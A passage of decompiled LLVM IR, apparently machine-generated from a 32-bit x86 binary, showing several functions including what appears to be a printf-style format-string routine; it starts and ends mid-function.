  %v5_804bce4 = sub i32 %v3_804bce1, %v4_804bce4
  store i32 %v5_804bce4, i32* %eax.global-to-local, align 4
  store i32 %v2_804bce7, i32* @edx, align 4
  store i32 %v0_804bcc0, i32* @ebx, align 4
  ret i32 %v5_804bce4

; uselistorder directives
  uselistorder i32 %v0_804bce1, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804bce1, { 1, 0 }
}

define i32 @function_804bcec() local_unnamed_addr {
dec_label_pc_804bcec:
  %stack_var_-13 = alloca i32, align 4
  %v0_804bcec = load i32, i32* @edi, align 4
  %v0_804bced = load i32, i32* @esi, align 4
  %v0_804bcee = load i32, i32* @ebx, align 4
  %v0_804bcef = load i32, i32* @eax, align 4
  store i32 %v0_804bcef, i32* @edi, align 4
  %v0_804bcf4 = load i32, i32* @ecx, align 4
  store i32 %v0_804bcf4, i32* @esi, align 4
  store i32 %v0_804bcf4, i32* @ebx, align 4
  %v0_804bcf8 = load i32, i32* @edx, align 4
  store i32 %v0_804bcf8, i32* %stack_var_-13, align 4
  %v1_804bcff2 = icmp eq i32 %v0_804bcf4, 0
  br i1 %v1_804bcff2, label %dec_label_pc_804bd17, label %dec_label_pc_804bd03.lr.ph

dec_label_pc_804bd03.lr.ph:                       ; preds = %dec_label_pc_804bcec
  %v2_804bd03 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804bd03

dec_label_pc_804bcfe:                             ; preds = %dec_label_pc_804bd03
  %v1_804bcfe = add i32 %v0_804bcfe, -1
  %v8_804bcfe = icmp eq i32 %v1_804bcfe, 0
  store i32 %v1_804bcfe, i32* @ebx, align 4
  br i1 %v8_804bcfe, label %dec_label_pc_804bd17.loopexit, label %dec_label_pc_804bcfe.dec_label_pc_804bd03_crit_edge

dec_label_pc_804bcfe.dec_label_pc_804bd03_crit_edge: ; preds = %dec_label_pc_804bcfe
  %v0_804bd07.pre = load i32, i32* @edx, align 4
  %v0_804bd08.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804bd03

dec_label_pc_804bd03:                             ; preds = %dec_label_pc_804bcfe.dec_label_pc_804bd03_crit_edge, %dec_label_pc_804bd03.lr.ph
  %v0_804bd08 = phi i32 [ %v0_804bd08.pre, %dec_label_pc_804bcfe.dec_label_pc_804bd03_crit_edge ], [ %v0_804bcef, %dec_label_pc_804bd03.lr.ph ]
  %v0_804bd07 = phi i32 [ %v0_804bd07.pre, %dec_label_pc_804bcfe.dec_label_pc_804bd03_crit_edge ], [ %v0_804bcf8, %dec_label_pc_804bd03.lr.ph ]
  %v4_804bd0c = call i32 @function_804f620(i32 %v2_804bd03, i32 1, i32 %v0_804bd08, i32 %v0_804bd07)
  %v8_804bd14 = icmp eq i32 %v4_804bd0c, 1
  %v0_804bcfe = load i32, i32* @ebx, align 4
  br i1 %v8_804bd14, label %dec_label_pc_804bcfe, label %dec_label_pc_804bd17.loopexit

dec_label_pc_804bd17.loopexit:                    ; preds = %dec_label_pc_804bcfe, %dec_label_pc_804bd03
  %v1_804bd17.ph = phi i32 [ %v0_804bcfe, %dec_label_pc_804bd03 ], [ 0, %dec_label_pc_804bcfe ]
  %v0_804bd17.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bd17

dec_label_pc_804bd17:                             ; preds = %dec_label_pc_804bd17.loopexit, %dec_label_pc_804bcec
  %v0_804bd17 = phi i32 [ 0, %dec_label_pc_804bcec ], [ %v0_804bd17.pre, %dec_label_pc_804bd17.loopexit ]
  %v1_804bd17 = phi i32 [ 0, %dec_label_pc_804bcec ], [ %v1_804bd17.ph, %dec_label_pc_804bd17.loopexit ]
  %v2_804bd17 = sub i32 %v0_804bd17, %v1_804bd17
  store i32 %v0_804bcee, i32* @ebx, align 4
  store i32 %v0_804bced, i32* @esi, align 4
  store i32 %v0_804bcec, i32* @edi, align 4
  ret i32 %v2_804bd17

; uselistorder directives
  uselistorder i32 %v1_804bcfe, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804bd17.loopexit, { 1, 0 }
}

define i32 @function_804bd22(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804bd22:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804bd35 = trunc i32 %arg2 to i8
  %v5_804bd35 = icmp slt i8 %v3_804bd35, 0
  %v1_804bd37 = icmp eq i1 %v5_804bd35, false
  br i1 %v1_804bd37, label %dec_label_pc_804bd68, label %dec_label_pc_804bd39

dec_label_pc_804bd39:                             ; preds = %dec_label_pc_804bd22
  %v1_804bd40 = inttoptr i32 %arg4 to i8*
  %v2_804bd40 = call i32 @function_804ce94(i8* %v1_804bd40)
  %v0_804bd48 = load i32, i32* @ebx, align 4
  %v2_804bd48 = sub i32 %v0_804bd48, %v2_804bd40
  store i32 %v2_804bd48, i32* @ebx, align 4
  store i32 %v2_804bd40, i32* @esi, align 4
  %tmp18 = icmp slt i32 %v2_804bd48, 1
  br i1 %tmp18, label %dec_label_pc_804bd66, label %dec_label_pc_804bd50

dec_label_pc_804bd50:                             ; preds = %dec_label_pc_804bd39
  %v0_804bd50 = load i32, i32* @edi, align 4
  %v1_804bd50 = urem i32 %v0_804bd50, 128
  store i32 %v1_804bd50, i32* @edi, align 4
  store i32 %v2_804bd48, i32* @ecx, align 4
  store i32 %v1_804bd50, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_804bd5b = call i32 @function_804bcec()
  store i32 %v0_804bd5b, i32* @ebp, align 4
  %v12_804bd62 = icmp eq i32 %v0_804bd5b, %v2_804bd48
  %v1_804bd64 = icmp eq i1 %v12_804bd62, false
  br i1 %v1_804bd64, label %dec_label_pc_804bd82, label %dec_label_pc_804bd50.dec_label_pc_804bd66_crit_edge

dec_label_pc_804bd50.dec_label_pc_804bd66_crit_edge: ; preds = %dec_label_pc_804bd50
  %v0_804bd66.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bd66

dec_label_pc_804bd66:                             ; preds = %dec_label_pc_804bd50.dec_label_pc_804bd66_crit_edge, %dec_label_pc_804bd39
  %v0_804bd66 = phi i32 [ %v0_804bd66.pre, %dec_label_pc_804bd50.dec_label_pc_804bd66_crit_edge ], [ %v2_804bd40, %dec_label_pc_804bd39 ]
  store i32 %v0_804bd66, i32* @ebx, align 4
  br label %dec_label_pc_804bd68

dec_label_pc_804bd68:                             ; preds = %dec_label_pc_804bd22, %dec_label_pc_804bd66
  %v0_804bd73 = phi i32 [ %arg3, %dec_label_pc_804bd22 ], [ %v0_804bd66, %dec_label_pc_804bd66 ]
  %tmp19 = icmp slt i32 %v0_804bd73, 1
  br i1 %tmp19, label %dec_label_pc_804bd80, label %dec_label_pc_804bd6e

dec_label_pc_804bd6e:                             ; preds = %dec_label_pc_804bd68
  %v0_804bd6e = load i32, i32* @ecx, align 4
  %v4_804bd78 = call i32 @function_804f620(i32 %arg4, i32 %v0_804bd73, i32 %arg1, i32 %v0_804bd6e)
  br label %dec_label_pc_804bd80

dec_label_pc_804bd80:                             ; preds = %dec_label_pc_804bd68, %dec_label_pc_804bd6e
  %v1_804bd80 = phi i32 [ 0, %dec_label_pc_804bd68 ], [ %v4_804bd78, %dec_label_pc_804bd6e ]
  %v0_804bd80 = load i32, i32* @ebp, align 4
  %v2_804bd80 = add i32 %v0_804bd80, %v1_804bd80
  br label %dec_label_pc_804bd82

dec_label_pc_804bd82:                             ; preds = %dec_label_pc_804bd50, %dec_label_pc_804bd80
  %v0_804bd85 = phi i32 [ %v0_804bd5b, %dec_label_pc_804bd50 ], [ %v2_804bd80, %dec_label_pc_804bd80 ]
  ret i32 %v0_804bd85

; uselistorder directives
  uselistorder i32 %v0_804bd73, { 1, 0 }
  uselistorder i32 %v0_804bd5b, { 1, 0, 2 }
  uselistorder i32 %v1_804bd50, { 1, 0 }
  uselistorder i32 %v2_804bd48, { 0, 2, 1, 3 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804bd82, { 1, 0 }
  uselistorder label %dec_label_pc_804bd80, { 1, 0 }
  uselistorder label %dec_label_pc_804bd68, { 1, 0 }
}

define i32 @function_804bd8c(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804bd8c:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_804bd96 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804bd96, i32* @ebx, align 4
  %v2_804bd9e = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804bd9e, i32* @esi, align 4
  %v4_804bda3 = call i32 @function_804c334(i32* nonnull %stack_var_-348, i32 %v4_804bd96)
  store i32 %v4_804bda3, i32* %eax.global-to-local, align 4
  %v2_804bdab = icmp slt i32 %v4_804bda3, 0
  %v1_804bdad = icmp eq i1 %v2_804bdab, false
  br i1 %v1_804bdad, label %dec_label_pc_804bded, label %dec_label_pc_804bdaf

dec_label_pc_804bdaf:                             ; preds = %dec_label_pc_804bd8c
  %v3_804bdaf = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804bdaf, i32* @ebx, align 4
  %v1_804bdb7 = inttoptr i32 %v3_804bdaf to i8*
  %v2_804bdb7 = call i32 @function_804ce94(i8* %v1_804bdb7)
  store i32 %v2_804bdb7, i32* %eax.global-to-local, align 4
  %v1_804bdbf = icmp eq i32 %v2_804bdb7, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_804bdbf, label %dec_label_pc_804c326, label %dec_label_pc_804bdce

dec_label_pc_804bdce:                             ; preds = %dec_label_pc_804bdaf
  %v0_804bdce = load i32, i32* @edx, align 4
  %v0_804bdd7 = load i32, i32* @ebx, align 4
  %v5_804bdd8 = call i32 @function_804f620(i32 %v0_804bdd7, i32 %v2_804bdb7, i32 %arg1, i32 %v0_804bdce)
  store i32 %v5_804bdd8, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_804c326

dec_label_pc_804bded:                             ; preds = %dec_label_pc_804bd8c
  %v5_804bdf7 = call i32 @function_804c3a4(i32 %v2_804bd9e, i32 %arg3, i32 %v4_804bda3, i32 %v4_804bda3)
  store i32 %v5_804bdf7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804be04 = load i32, i32* @ebx, align 4
  store i32 %v0_804be04, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804be0c

dec_label_pc_804be0b:                             ; preds = %dec_label_pc_804be12
  %v1_804be0b = add i32 %v0_804be1a, 1
  store i32 %v1_804be0b, i32* @ebx, align 4
  br label %dec_label_pc_804be0c.backedge

dec_label_pc_804be0c.backedge:                    ; preds = %dec_label_pc_804be0b, %dec_label_pc_804c30c, %dec_label_pc_804c317
  %v1_804be1619 = phi i32 [ %v1_804be1e, %dec_label_pc_804be0b ], [ %v3_804c30c, %dec_label_pc_804c30c ], [ %v1_804be4a, %dec_label_pc_804c317 ]
  %v0_804be0c17 = phi i32 [ %v1_804be0b, %dec_label_pc_804be0b ], [ %v3_804c30c, %dec_label_pc_804c30c ], [ %v1_804c317, %dec_label_pc_804c317 ]
  %v4_804be0c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804be0c

dec_label_pc_804be0c:                             ; preds = %dec_label_pc_804be0c.backedge, %dec_label_pc_804bded
  %v1_804be1e = phi i32 [ %v1_804be1619, %dec_label_pc_804be0c.backedge ], [ %v0_804be04, %dec_label_pc_804bded ]
  %v0_804be1a = phi i32 [ %v0_804be0c17, %dec_label_pc_804be0c.backedge ], [ %v0_804be04, %dec_label_pc_804bded ]
  %v4_804be0c = phi i32 [ %v4_804be0c.pre, %dec_label_pc_804be0c.backedge ], [ %v5_804bdf7, %dec_label_pc_804bded ]
  %v1_804be0c = inttoptr i32 %v0_804be1a to i8*
  %v2_804be0c = load i8, i8* %v1_804be0c, align 1
  %v3_804be0c = zext i8 %v2_804be0c to i32
  %v5_804be0c = and i32 %v4_804be0c, -256
  %v6_804be0c = or i32 %v3_804be0c, %v5_804be0c
  store i32 %v6_804be0c, i32* %eax.global-to-local, align 4
  %v4_804be0e = icmp eq i8 %v2_804be0c, 0
  br i1 %v4_804be0e, label %dec_label_pc_804be16, label %dec_label_pc_804be12

dec_label_pc_804be12:                             ; preds = %dec_label_pc_804be0c
  %v10_804be12 = icmp eq i8 %v2_804be0c, 37
  %v1_804be14 = icmp eq i1 %v10_804be12, false
  br i1 %v1_804be14, label %dec_label_pc_804be0b, label %dec_label_pc_804be16

dec_label_pc_804be16:                             ; preds = %dec_label_pc_804be12, %dec_label_pc_804be0c
  %v2_804be16 = sub i32 %v0_804be1a, %v1_804be1e
  %v12_804be16 = icmp eq i32 %v2_804be16, 0
  br i1 %v12_804be16, label %dec_label_pc_804be41, label %dec_label_pc_804be1a

dec_label_pc_804be1a:                             ; preds = %dec_label_pc_804be16
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804be16, i32* @esi, align 4
  %tmp65 = icmp slt i32 %v2_804be16, 1
  br i1 %tmp65, label %dec_label_pc_804be36, label %dec_label_pc_804be24

dec_label_pc_804be24:                             ; preds = %dec_label_pc_804be1a
  %v0_804be24 = load i32, i32* @ebp, align 4
  %v1_804be24 = load i32, i32* @esp, align 4
  %v2_804be24 = add i32 %v1_804be24, -4
  %v3_804be24 = inttoptr i32 %v2_804be24 to i32*
  store i32 %v0_804be24, i32* %v3_804be24, align 4
  %v1_804be25 = add i32 %v1_804be24, 368
  %v2_804be25 = inttoptr i32 %v1_804be25 to i32*
  %v3_804be25 = load i32, i32* %v2_804be25, align 4
  %v5_804be25 = add i32 %v1_804be24, -8
  %v6_804be25 = inttoptr i32 %v5_804be25 to i32*
  store i32 %v3_804be25, i32* %v6_804be25, align 4
  %v0_804be2c = load i32, i32* @esi, align 4
  %v2_804be2c = add i32 %v1_804be24, -12
  %v3_804be2c = inttoptr i32 %v2_804be2c to i32*
  store i32 %v0_804be2c, i32* %v3_804be2c, align 4
  %v0_804be2d = load i32, i32* %edx.global-to-local, align 4
  %v2_804be2d = add i32 %v1_804be24, -16
  %v3_804be2d = inttoptr i32 %v2_804be2d to i32*
  store i32 %v0_804be2d, i32* %v3_804be2d, align 4
  %v0_804be2e = load i32, i32* %stack_var_-364, align 4
  %v4_804be2e = call i32 @function_804f620(i32 %v0_804be2e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804be2e, i32* %eax.global-to-local, align 4
  %v1_804be36.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804be36

dec_label_pc_804be36:                             ; preds = %dec_label_pc_804be1a, %dec_label_pc_804be24
  %v3_804be3e = phi i32 [ %v2_804be16, %dec_label_pc_804be1a ], [ %v1_804be36.pre, %dec_label_pc_804be24 ]
  %v0_804be36 = phi i32 [ 0, %dec_label_pc_804be1a ], [ %v4_804be2e, %dec_label_pc_804be24 ]
  %v12_804be36 = icmp eq i32 %v0_804be36, %v3_804be3e
  %v1_804be38 = icmp eq i1 %v12_804be36, false
  %v0_804c31f.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804be38, label %dec_label_pc_804c31f, label %dec_label_pc_804be3e

dec_label_pc_804be3e:                             ; preds = %dec_label_pc_804be36
  %v1_804be3e = inttoptr i32 %v0_804c31f.pre.pre to i32*
  %v2_804be3e = load i32, i32* %v1_804be3e, align 4
  %v4_804be3e = add i32 %v2_804be3e, %v3_804be3e
  store i32 %v4_804be3e, i32* %v1_804be3e, align 4
  %v0_804be41.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804be41

dec_label_pc_804be41:                             ; preds = %dec_label_pc_804be16, %dec_label_pc_804be3e
  %v0_804c317 = phi i32 [ %v0_804be1a, %dec_label_pc_804be16 ], [ %v0_804be41.pre, %dec_label_pc_804be3e ]
  %v1_804be41 = inttoptr i32 %v0_804c317 to i8*
  %v2_804be41 = load i8, i8* %v1_804be41, align 1
  %v3_804be41 = icmp eq i8 %v2_804be41, 0
  br i1 %v3_804be41, label %dec_label_pc_804c326, label %dec_label_pc_804be4a

dec_label_pc_804be4a:                             ; preds = %dec_label_pc_804be41
  %v1_804be4a = add i32 %v0_804c317, 1
  store i32 %v1_804be4a, i32* %edx.global-to-local, align 4
  %v2_804be4d = inttoptr i32 %v1_804be4a to i8*
  %v3_804be4d = load i8, i8* %v2_804be4d, align 1
  %v12_804be4d = icmp eq i8 %v3_804be4d, 37
  br i1 %v12_804be4d, label %dec_label_pc_804c317, label %dec_label_pc_804be57

dec_label_pc_804be57:                             ; preds = %dec_label_pc_804be4a
  %v1_804be57 = load i32, i32* @esp, align 4
  %v2_804be57 = add i32 %v1_804be57, 16
  %v3_804be57 = inttoptr i32 %v2_804be57 to i32*
  store i32 %v1_804be4a, i32* %v3_804be57, align 4
  %v0_804be5b = load i32, i32* @esp, align 4
  %v1_804be5b = add i32 %v0_804be5b, 340
  %v2_804be5b = inttoptr i32 %v1_804be5b to i32*
  store i32 0, i32* %v2_804be5b, align 4
  %v0_804be66 = load i32, i32* @esp, align 4
  %v1_804be69 = add i32 %v0_804be66, 16
  store i32 %v1_804be69, i32* @ebx, align 4
  %v2_804be6d = add i32 %v0_804be66, -16
  %v3_804be6d = inttoptr i32 %v2_804be6d to i32*
  store i32 %v1_804be69, i32* %v3_804be6d, align 4
  %v0_804be6e = load i32, i32* %stack_var_-364, align 4
  %v1_804be6e = inttoptr i32 %v0_804be6e to i32*
  %v2_804be6e = call i32 @function_804c521(i32* %v1_804be6e)
  store i32 %v2_804be6e, i32* %eax.global-to-local, align 4
  %v0_804be73 = load i32, i32* @ebx, align 4
  %v1_804be73 = load i32, i32* @esp, align 4
  %v2_804be73 = inttoptr i32 %v1_804be73 to i32*
  store i32 %v0_804be73, i32* %v2_804be73, align 4
  %v0_804be76 = load i32, i32* %stack_var_-364, align 4
  %v1_804be76 = call i32 @function_804c3e8(i32 %v0_804be76)
  store i32 %v1_804be76, i32* %eax.global-to-local, align 4
  %v0_804be7b = load i32, i32* @esp, align 4
  %v1_804be7b = add i32 %v0_804be7b, 70
  %v2_804be7b = inttoptr i32 %v1_804be7b to i8*
  %v3_804be7b = load i8, i8* %v2_804be7b, align 1
  %v4_804be7b = zext i8 %v3_804be7b to i32
  store i32 %v4_804be7b, i32* @edi, align 4
  %v1_804be80 = add i32 %v0_804be7b, 16
  %v1_804be83 = add i32 %v0_804be7b, 56
  %v2_804be83 = inttoptr i32 %v1_804be83 to i32*
  %v3_804be83 = load i32, i32* %v2_804be83, align 4
  %v1_804be88 = add i32 %v0_804be7b, 112
  store i32 %v1_804be88, i32* %edx.global-to-local, align 4
  %tmp66 = icmp slt i32 %v3_804be83, 1
  br i1 %tmp66, label %dec_label_pc_804be95, label %dec_label_pc_804be8e

dec_label_pc_804be8e:                             ; preds = %dec_label_pc_804be57
  %v2_804be8e = zext i8 %v3_804be7b to i32
  %v3_804be8e = mul nuw nsw i32 %v2_804be8e, 12
  store i32 %v3_804be8e, i32* %eax.global-to-local, align 4
  %v2_804be91 = add i32 %v0_804be7b, 100
  %v3_804be91 = add i32 %v2_804be91, %v3_804be8e
  store i32 %v3_804be91, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804be95

dec_label_pc_804be95:                             ; preds = %dec_label_pc_804be57, %dec_label_pc_804be8e
  %v0_804be9d27 = phi i32 [ %v1_804be88, %dec_label_pc_804be57 ], [ %v3_804be91, %dec_label_pc_804be8e ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804be97 = add i32 %v0_804be7b, 60
  %v2_804be97 = inttoptr i32 %v1_804be97 to i32*
  %v3_804be97 = load i32, i32* %v2_804be97, align 4
  store i32 %v3_804be97, i32* %ecx.global-to-local, align 4
  %v2_804bea879 = sub i32 0, %v3_804be97
  %v10_804bea882 = and i32 %v3_804be97, %v2_804bea879
  %v11_804bea883 = icmp slt i32 %v10_804bea882, 0
  %v13_804bea884 = icmp slt i32 %v2_804bea879, 0
  %v2_804beaa85 = icmp eq i1 %v13_804bea884, %v11_804bea883
  br i1 %v2_804beaa85, label %dec_label_pc_804beac, label %dec_label_pc_804be9d

dec_label_pc_804be9d:                             ; preds = %dec_label_pc_804be95, %dec_label_pc_804be9d
  %v0_804beac89 = phi i32 [ %v0_804beac, %dec_label_pc_804be9d ], [ %v1_804be80, %dec_label_pc_804be95 ]
  %v2_804be9d88 = phi i32 [ %v1_804bea7, %dec_label_pc_804be9d ], [ 0, %dec_label_pc_804be95 ]
  %v0_804be9d87 = phi i32 [ %v1_804bea4, %dec_label_pc_804be9d ], [ %v0_804be9d27, %dec_label_pc_804be95 ]
  %v3_804be9d = mul i32 %v2_804be9d88, 4
  %v4_804be9d = add i32 %v0_804beac89, 344
  %v5_804be9d = add i32 %v4_804be9d, %v3_804be9d
  %v6_804be9d = inttoptr i32 %v5_804be9d to i32*
  store i32 %v0_804be9d87, i32* %v6_804be9d, align 4
  %v0_804bea4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804bea4 = add i32 %v0_804bea4, 12
  store i32 %v1_804bea4, i32* %edx.global-to-local, align 4
  %v0_804bea7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bea7 = add i32 %v0_804bea7, 1
  store i32 %v1_804bea7, i32* %eax.global-to-local, align 4
  %v1_804bea8.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804bea8 = sub i32 %v1_804bea7, %v1_804bea8.pre
  %v8_804bea8 = xor i32 %v1_804bea7, %v1_804bea8.pre
  %v9_804bea8 = xor i32 %v2_804bea8, %v1_804bea7
  %v10_804bea8 = and i32 %v9_804bea8, %v8_804bea8
  %v11_804bea8 = icmp slt i32 %v10_804bea8, 0
  %v13_804bea8 = icmp slt i32 %v2_804bea8, 0
  %v2_804beaa = icmp eq i1 %v13_804bea8, %v11_804bea8
  %v0_804beac = load i32, i32* @esp, align 4
  br i1 %v2_804beaa, label %dec_label_pc_804beac, label %dec_label_pc_804be9d

dec_label_pc_804beac:                             ; preds = %dec_label_pc_804be9d, %dec_label_pc_804be95
  %v0_804beac.lcssa = phi i32 [ %v1_804be80, %dec_label_pc_804be95 ], [ %v0_804beac, %dec_label_pc_804be9d ]
  %v1_804beac = add i32 %v0_804beac.lcssa, 48
  %v2_804beac = inttoptr i32 %v1_804beac to i32*
  %v3_804beac = load i32, i32* %v2_804beac, align 4
  store i32 %v3_804beac, i32* @ecx, align 4
  %v1_804beb0 = icmp eq i32 %v3_804beac, 0
  %v1_804beb2 = icmp eq i1 %v1_804beb0, false
  br i1 %v1_804beb2, label %dec_label_pc_804beda, label %dec_label_pc_804beb4

dec_label_pc_804beb4:                             ; preds = %dec_label_pc_804beac
  %v1_804beb4 = inttoptr i32 %v0_804beac.lcssa to i32*
  %v2_804beb4 = load i32, i32* %v1_804beb4, align 4
  store i32 %v2_804beb4, i32* %eax.global-to-local, align 4
  %v1_804beb7 = ashr i32 %v2_804beb4, 31
  store i32 %v1_804beb7, i32* %edx.global-to-local, align 4
  %v2_804beb8 = add i32 %v0_804beac.lcssa, -4
  %v3_804beb8 = inttoptr i32 %v2_804beb8 to i32*
  store i32 %v1_804beb7, i32* %v3_804beb8, align 4
  %v0_804beb9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804beb9 = add i32 %v0_804beac.lcssa, -8
  %v3_804beb9 = inttoptr i32 %v2_804beb9 to i32*
  store i32 %v0_804beb9, i32* %v3_804beb9, align 4
  %v1_804beba = add i32 %v0_804beac.lcssa, 32
  %v2_804beba = inttoptr i32 %v1_804beba to i32*
  %v3_804beba = load i32, i32* %v2_804beba, align 4
  %v1_804bebe = and i32 %v3_804beba, 3840
  store i32 %v1_804bebe, i32* %eax.global-to-local, align 4
  %v2_804bec3 = add i32 %v0_804beac.lcssa, -12
  %v3_804bec3 = inttoptr i32 %v2_804bec3 to i32*
  store i32 %v1_804bebe, i32* %v3_804bec3, align 4
  %v1_804bec4 = add i32 %v0_804beac.lcssa, 344
  %v2_804bec4 = inttoptr i32 %v1_804bec4 to i32*
  %v3_804bec4 = load i32, i32* %v2_804bec4, align 4
  store i32 %v3_804bec4, i32* %eax.global-to-local, align 4
  %v1_804becb = inttoptr i32 %v3_804bec4 to i32*
  %v2_804becb = load i32, i32* %v1_804becb, align 4
  %v4_804becb = add i32 %v0_804beac.lcssa, -16
  %v5_804becb = inttoptr i32 %v4_804becb to i32*
  store i32 %v2_804becb, i32* %v5_804becb, align 4
  %v0_804becd = call i32 @function_804f808()
  store i32 %v0_804becd, i32* %eax.global-to-local, align 4
  %v0_804bed2 = load i32, i32* @esp, align 4
  %v1_804bed2 = add i32 %v0_804bed2, 16
  br label %dec_label_pc_804c30c

dec_label_pc_804beda:                             ; preds = %dec_label_pc_804beac
  %tmp92 = icmp ult i32 %v3_804beac, 8
  br i1 %tmp92, label %dec_label_pc_804bee3, label %dec_label_pc_804c044

dec_label_pc_804bee3:                             ; preds = %dec_label_pc_804beda
  %v1_804bee3 = add i32 %v3_804beac, 134557756
  %v2_804bee3 = inttoptr i32 %v1_804bee3 to i8*
  %v3_804bee3 = load i8, i8* %v2_804bee3, align 1
  %v4_804bee3 = sext i8 %v3_804bee3 to i32
  store i32 %v4_804bee3, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804beef = icmp eq i8 %v3_804bee3, 10
  %v1_804bef2 = icmp eq i1 %v9_804beef, false
  br i1 %v1_804bef2, label %dec_label_pc_804bf10, label %dec_label_pc_804bef4

dec_label_pc_804bef4:                             ; preds = %dec_label_pc_804bee3
  %v1_804bef4 = add i32 %v0_804beac.lcssa, 32
  %v2_804bef4 = inttoptr i32 %v1_804bef4 to i32*
  %v3_804bef4 = load i32, i32* %v2_804bef4, align 4
  %v1_804befa = and i32 %v3_804bef4, 32
  store i32 %v1_804befa, i32* %eax.global-to-local, align 4
  %tmp67 = udiv i32 %v1_804befa, 32
  %tmp68 = sub nsw i32 45, %tmp67
  store i32 %tmp68, i32* @ebx, align 4
  %v1_804bf08 = trunc i32 %v3_804bef4 to i8
  %v2_804bf08 = and i8 %v1_804bf08, 64
  %v3_804bf08 = icmp eq i8 %v2_804bf08, 0
  %v5_804bf08 = zext i8 %v2_804bf08 to i32
  %v7_804bf08 = and i32 %v3_804bef4, -256
  %v8_804bf08 = or i32 %v5_804bf08, %v7_804bf08
  store i32 %v8_804bf08, i32* %edx.global-to-local, align 4
  br i1 %v3_804bf08, label %dec_label_pc_804bf10, label %dec_label_pc_804bf0d

dec_label_pc_804bf0d:                             ; preds = %dec_label_pc_804bef4
  %v2_804bf0d = or i32 %tmp68, 128
  store i32 %v2_804bf0d, i32* @ebx, align 4
  br label %dec_label_pc_804bf10

dec_label_pc_804bf10:                             ; preds = %dec_label_pc_804bef4, %dec_label_pc_804bee3, %dec_label_pc_804bf0d
  %tmp93 = icmp ult i32 %v3_804beac, 6
  br i1 %tmp93, label %dec_label_pc_804bf15, label %dec_label_pc_804bf2d

dec_label_pc_804bf15:                             ; preds = %dec_label_pc_804bf10
  %v9_804bf15 = icmp eq i32 %v3_804beac, 3
  %v1_804bf18 = icmp eq i1 %v9_804bf15, false
  br i1 %v1_804bf18, label %dec_label_pc_804bf21, label %dec_label_pc_804bf1a

dec_label_pc_804bf1a:                             ; preds = %dec_label_pc_804bf15
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804bf2f

dec_label_pc_804bf21:                             ; preds = %dec_label_pc_804bf15
  %v9_804bf26 = icmp eq i32 %v3_804beac, 1
  br i1 %v9_804bf26, label %dec_label_pc_804bf34, label %dec_label_pc_804bf2f

dec_label_pc_804bf2d:                             ; preds = %dec_label_pc_804bf10
  %v1_804bf2d = sub nsw i32 0, %v4_804bee3
  store i32 %v1_804bf2d, i32* @esi, align 4
  br label %dec_label_pc_804bf2f

dec_label_pc_804bf2f:                             ; preds = %dec_label_pc_804bf21, %dec_label_pc_804bf1a, %dec_label_pc_804bf2d
  br label %dec_label_pc_804bf34

dec_label_pc_804bf34:                             ; preds = %dec_label_pc_804bf21, %dec_label_pc_804bf2f
  %storemerge104 = phi i32 [ 11, %dec_label_pc_804bf2f ], [ 6, %dec_label_pc_804bf21 ]
  store i32 %storemerge104, i32* @ebp, align 4
  %v1_804bf34 = add i32 %v0_804beac.lcssa, 7
  %v2_804bf34 = inttoptr i32 %v1_804bf34 to i8*
  store i8 32, i8* %v2_804bf34, align 1
  %v0_804bf39 = load i32, i32* @esp, align 4
  %v1_804bf39 = add i32 %v0_804bf39, 20
  %v2_804bf39 = inttoptr i32 %v1_804bf39 to i32*
  %v3_804bf39 = load i32, i32* %v2_804bf39, align 4
  %v5_804bf39 = icmp slt i32 %v3_804bf39, 0
  %v1_804bf3e = icmp eq i1 %v5_804bf39, false
  br i1 %v1_804bf3e, label %dec_label_pc_804bf48, label %dec_label_pc_804bf40

dec_label_pc_804bf40:                             ; preds = %dec_label_pc_804bf34
  %v1_804bf40 = add i32 %v0_804bf39, 36
  %v2_804bf40 = inttoptr i32 %v1_804bf40 to i8*
  %v3_804bf40 = load i8, i8* %v2_804bf40, align 1
  %v4_804bf40 = zext i8 %v3_804bf40 to i32
  %v5_804bf40 = load i32, i32* %edx.global-to-local, align 4
  %v6_804bf40 = and i32 %v5_804bf40, -256
